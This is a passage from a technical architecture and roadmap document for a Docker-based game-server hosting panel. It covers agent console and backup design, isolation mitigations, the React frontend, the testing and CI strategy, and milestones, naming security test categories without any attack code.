- **Console:** `Tty:false` + `stdcopy.StdCopy` demux (never a real TTY, which would let escape sequences and merged streams leak). A ring buffer (500 lines / 256 KiB cap) survives disconnects and crashes; late joiners replay from `?since=<seq>` with an explicit `gap` marker if truncated. Backpressure: per-subscriber buffered channel with **non-blocking send** — a slow viewer drops frames (with a `truncated` marker) and never stalls the pump, the ring, or other viewers. Input: token-bucketed (5 lines/s, burst 10, 1 KiB/line), goes to **container stdin only**, never a host shell, never logged verbatim into anything structured.
- **Stats:** one long-lived `ContainerStats` stream per running container (not a per-tick poll — QA flagged the per-call variant as costing ~10ms of daemon time each and not scaling past ~20 containers), pushed as normalized frames every 2s. `memory_bytes` explicitly subtracts page-cache (`inactive_file`) from Docker's raw `usage`, or every server falsely reads near 100% memory.
- **Backups:** fully streaming tar.gz (`WalkDir -> tar -> gzip -> sha256 tee`, constant memory regardless of server size), ignore-pattern matching (node defaults + per-request + `.pxignore`), throttled to protect node IO, stored **outside** the bind-mounted tree (so a container can't delete its own backups or inflate its own quota). Restore: server must be stopped, dry-run header validation before any byte is written, extraction into a sibling staging directory, then an atomic `rename(2)` swap (or `renameat2(RENAME_EXCHANGE)` where available) — the old directory is kept for a grace window before background deletion, so a bad restore is recoverable.

### 4.6 Threat model -> mitigation -> test (summary; full table in §6)

| Requirement | Primary mitigation |
|---|---|
| No host access | full namespace isolation, `CapDrop:ALL`, seccomp+AppArmor, read-only rootfs, `INPUT` rule blocking the agent's own port |
| No cross-container access | `enable_icc=false` + `DOCKER-USER` forward-drop, verified at the kernel level |
| No Docker socket access | never mounted; hardcoded rejection of any socket-resolving mount source |
| No container escape | caps dropped, no privileged, no device access, seccomp blocks the `io_uring`/`unshare`/mount-family escape chains |
| No cross-customer file read | unique uid per server, `0750` dirs, jail resolver on every path, backups outside the data tree |
| No arbitrary host command execution | zero `exec.Command` surfaces in the codebase except a hardcoded-argv firewall wrapper (CI-enforced by grep/lint); tokenize-then-substitute for all customer-influenced strings |

---

## 5. Panel (React)

### 5.1 Stack & structure

Vite + React + TS, **TanStack Router** (file-based, typed `beforeLoad` guards, `validateSearch` with Zod for URL-owned state — needed heavily by the file manager's `?directory=` and every admin table's `?page&sort&query`), **TanStack Query v5** for server state, **Zustand** for client state (chosen over Context specifically because the console/stats update at 1-20 Hz and Context would re-render every consumer), **React Hook Form + Zod** for forms sharing types with the generated API client, **TailwindCSS v4** with CSS-variable tokens for dark-first theming.

```
apps/panel/src/
+-- app/{providers, router.tsx, guards.ts}
+-- features/{auth,servers,console,files,databases,backups,schedules,
|             subusers,network,startup,settings,account,admin/*}
+-- shared/{api, realtime, permissions, hooks, lib, stores}
+-- ui/{primitives, overlays, data, feedback, layout}       # never imports features/
+-- locales/{pt-BR, en}/*.json
```

Route map covers the full client area (dashboard, per-server console/files/databases/backups/schedules/users/network/startup/settings/activity) and admin area (customers, servers, nodes incl. bootstrap-token view, locations, plans, eggs, metrics, audit, roles), each gated by the shared `permissions.json` generated from the API.

### 5.2 Realtime layer

Browser connects **directly** to the agent's WSS (same reasoning as §3.5): `useServerSocket` fetches a token from the API, opens the socket, sends `auth`, receives scrollback + `stats`. Token refresh happens **in-place on the same connection** — no reconnect, no output gap. Reconnect is an exponential-jittered backoff state machine (`idle->connecting->authenticating->open->reconnecting->failed`), suppressed while the tab is hidden >60s, retried instantly on `visibilitychange`/`online`.

Console rendering: `xterm.js` (`Tty:false`-compatible), `disableStdin:true` with a separate `<input>` for commands (keeps it translatable and accessible), backpressure via a `requestAnimationFrame` write-batching loop that drops-and-marks past 2000 pending lines/frame — "the difference between a usable console and a locked tab." Stats: **uPlot**, fed by a plain ring buffer in a `useRef` updated on a single 1Hz interval via `chart.setData()` and `textContent` writes — **zero React re-renders per second** on the console page.

### 5.3 Security

- **Token storage:** access token in memory only (never `localStorage`), refresh token in an `HttpOnly Secure SameSite=Lax` cookie scoped to `/api/auth` — matches the API's model exactly.
- **XSS:** `dangerouslySetInnerHTML` banned by lint rule with zero exceptions; console output never touches the DOM as HTML (xterm parses ANSI into cells); a strict CSP (`default-src 'self'`, no inline scripts) is required from the API; file downloads must be `Content-Disposition: attachment` from a **separate origin** than the panel (an uploaded `.html` served inline on the panel's own origin would be stored XSS).
- **Permission-driven rendering is UX, not security** — stated as a code comment on `<PermissionGate>`; the API re-checks everything server-side, and a `403` mid-session triggers a refetch (permissions may have changed).
- **Signed URLs** are fetched at the moment of the action, never rendered ahead of time (prevents copy-link leakage), never logged.

### 5.4 First increment (build order once the Agent + a minimal API exist)

Skeleton -> Auth+session -> Dashboard/server list -> **Console** (the keystone: realtime, xterm, live stats, power controls with kill-confirm) -> **File Manager** (browse/edit/upload/download with the quota/dirty-guard/virtualization patterns) -> **Backups** (quota display, create, restore with typed-name confirmation). Everything else (Schedules, Subusers, Databases, Network, Startup, Settings, the full Admin area) is increment 2+, because steps 1-5 are what establish the four patterns (realtime, signed-URL, quota, destructive-confirm) that the rest of the app reuses.

---

## 6. Testing & QA Strategy

### 6.1 Pyramid per component

| Component | Unit | Integration | Notes |
|---|---|---|---|
| Go agent | `testing`+testify, real filesystem via `t.TempDir()` (real symlinks), Docker behind a narrow `Engine` interface with a hand-written fake | real Docker daemon on the dev VM / CI runner, against a purpose-built **15 MB `test-gameserver` image** (not real Minecraft) that can simulate crash/OOM/disk-fill/fork-bomb/ANSI-spam on command | `BuildContainerSpec` as a pure function makes the isolation invariants (§4.3) **unit-testable in 2 seconds**, not a 6-minute Docker job |
| NestJS API | Jest + `@nestjs/testing`, repos/Redis/agent-client faked | supertest against real Postgres+Redis (Testcontainers), agent replaced by a **fake-agent harness** with fault-injection endpoints (`/__test/fail-next`, `/__test/offline`, `/__test/latency`) | a mechanized test walks the OpenAPI route table and fails the build if any non-public route lacks a registered authz-negative test |
| React panel | Vitest + RTL + MSW (mocks generated from the OpenAPI schema so they can't drift) | Playwright E2E | console component takes an injectable transport so tests never need a real socket |

Never mock the filesystem or the database in integration tests — path/symlink and row-scoping bugs live in real syscall/constraint semantics.

### 6.2 Local environment

Windows dev box (Docker Desktop, the compose stack: Postgres, Redis, API, panel, mailhog, minio) + a **dedicated Linux VM** on a host-only network (mirrors production's private node network) running the real agent against real Docker. `hack/gen-certs.sh` produces the local CA plus valid/expired/wrong-CA fixtures for mTLS tests. Seed data fixes two users each owning one server — "the single most valuable seed fact in the whole system," since it turns every IDOR test into a one-liner.

Two permanent (not throwaway) test doubles: a **fake-panel harness** (unblocks agent development before the API exists) and a **fake-agent harness** (unblocks API development before the agent exists, with fault injection for node-offline/timeout/5xx scenarios).

### 6.3 Security test plan (categories; full case table in the implementation PR)

Path traversal & symlink escape (incl. a TOCTOU race loop) - zip-slip & decompression bombs - command injection via server name/startup vars/console input/template scripts - IDOR (mechanized sweep over every route with a resource-id param, always expecting 404 not 403) - privilege escalation (user->admin, subuser->owner, permission-grant ceiling) - **container escape & isolation** (docker-socket reachability, capability inspection, host-mount inspection, container<->container network probes, host/metadata-IP reachability from inside a container, cgroup release_agent escape) - SSRF (node FQDN, backup/webhook URLs, DNS rebinding) - JWT/token attacks (`alg:none`, algorithm confusion, replay, audience confusion between panel and agent tokens) - rate-limit bypass (spoofed XFF, cross-replica correctness) - resource exhaustion (fork bomb, memory/CPU/disk/inode/log-flood, Slowloris on the agent's HTTP server) - log injection & stored XSS in console/file content.

### 6.4 CI

PR-required: lint, typecheck, unit suites (both langs), API integration, a `-short` Docker-backed agent integration subset (container lifecycle + all `BuildContainerSpec` assertions — QA is explicit that deferring *all* Docker tests to nightly leaves the platform's core invariants unverified at review time), contract check (OpenAPI diff + JSON-schema validation on both sides of the agent boundary), static security analysis (gosec, govulncheck, semgrep custom rules banning `exec.Command`/raw SQL/`dangerouslySetInnerHTML`, gitleaks), Trivy image scan, Playwright smoke. Nightly: full Docker integration incl. resource-exhaustion cases, real-game-image E2E, load tests (k6), a chaos suite (agent killed mid-install, Docker daemon down, node network partition, clock skew, Postgres/Redis down).

---

## 7. Repository layout

```
hosting-panel/
+-- apps/
|  +-- api/            # NestJS -- see 3.8
|  +-- panel/           # React -- see 5.1
+-- agent/              # Go -- see 4.2
+-- packages/
|  +-- api-types/       # generated OpenAPI types + typed fetch client, consumed by the panel
+-- contracts/           # openapi.json, agent/*.schema.json, permissions.matrix.json -- shared truth
+-- tools/
|  +-- fake-agent/       # fault-injecting agent double (permanent test infra, not scaffolding)
+-- hack/
|  +-- fakepanel/        # agent-side dev harness
|  +-- gen-certs.sh
|  +-- attack/            # hostile-input CI suite
+-- docs/
|  +-- ARCHITECTURE.md   # this file
+-- docker-compose.dev.yml
```

---

## 8. Incremental roadmap

Node Agent goes first per the user's explicit requirement — it de-risks the hardest, least-familiar component (Docker + Go + streaming + kernel-level security) while the schema is still cheap to change.

| # | Milestone | Components | Definition of done |
|---|---|---|---|
| **M1** * | Agent core: Docker lifecycle | Agent | CLI creates/starts/stops/kills a container from a local JSON config with correct limits applied; `docker stats` confirms them |
| **M2** * | Agent API: auth, console, stats | Agent | Authenticated control surface; console attach/detach; stats stream; graceful reconnect |
| **M3** * | Data foundation + identity | API, DB | Full schema migrated; RLS proven (non-owner query returns 0 rows); login/refresh/logout works; root admin seeded |
| **M4** * | Infrastructure catalog | API, Agent | Admin creates a node, agent bootstraps via mTLS, heartbeats to `online`; a Minecraft (Paper) template seeded |
| **M5** * | Provisioning: create->install->ready | API, Agent | One API call -> capacity-checked, allocation-reserved, limit-snapshotted, install-dispatched, `ready` server on the VM with files on disk; concurrent-create race test passes |
| **M6** * | Panel MVP | Panel, API | Login -> server list -> start -> console reaches "Done" -> send a command -> live CPU/RAM move. **End-to-end vertical slice complete.** |
| M7 | File manager | Agent, API, Panel | Edit `server.properties` in-browser, restart, see it in-game; `../` escape rejected; 2 GB upload works |
| M8 | Backups | Agent, API, Panel | Delete the world, restore from backup, world is back; quota enforced; download link short-lived+single-use |
| M9 | Databases | API, Panel | Plugin connects with created credentials; server deletion drops the schema+user |
| M10 | Schedules | API, Panel | Nightly restart+backup runs unattended, respects timezone and node-offline skip, never double-fires |
| M11 | Subusers, granular RBAC, activity feed | API, Panel | Invited friend can restart but not delete backups; every mutation attributed in the feed |
| M12 | Admin console | Panel, API | Onboard a new node and a new game from the UI only; plan-apply dry run works |
| M13 | Hardening & operations | All | Live node-to-node transfer with no data loss; token rotation; log partition automation |
| M14 | Billing hooks (deferred) | API | External payment event idempotently suspends/restores a server |
| M15 | Commercial site: public catalog + subscriptions | API, Panel | Visitor browses plans and vagas-aware availability with no auth, signs up (behind `ALLOW_PUBLIC_REGISTRATION`), subscribes (`pending`), admin activates in `/admin/subscriptions`; customer sees it in `/client/subscription`. No payment gateway, no auto-provisioning — see §2.6.1 |

\* = required for the minimal end-to-end vertical slice (M1-M6).

---

## 9. Open items confirmed by default (flag if you want a different call)

1. **Disk quota v1** is software-accounted, not XFS project quotas — acceptable for the "world grew too big" abuse case, revisit before charging real money.
2. **Backup default adapter** is local (on-node); S3 lands in M8 behind the same `Provider` interface.
3. **Support staff console access** is read-only by default, fully audited, and visible in the customer's own activity feed.
4. **Self-service server deletion is disabled by default** — customers request, staff/automation execute — to prevent rage-deletes; toggleable per instance.
5. **PostgreSQL floor is 17+**, targeting 18 for native `uuidv7()` (a one-line migration to swap the SQL-shim version if you start on 17).
6. **Public self-signup is off by default** (`ALLOW_PUBLIC_REGISTRATION=false`) — an existing deployment's behavior never changes on upgrade; only an admin can create a user until an operator explicitly opts in.
7. **Subscription activation is admin-only**, with no mock/test payment path reachable in production — see §2.6.1. A future payment webhook is the only intended way to automate this, and it reuses `SubscriptionsService.updateStatusAsAdmin`'s transition machine rather than adding a second one.

---

*Next step: your confirmation to begin implementation, starting with M1 (Node Agent core Docker lifecycle) per your original instruction.*
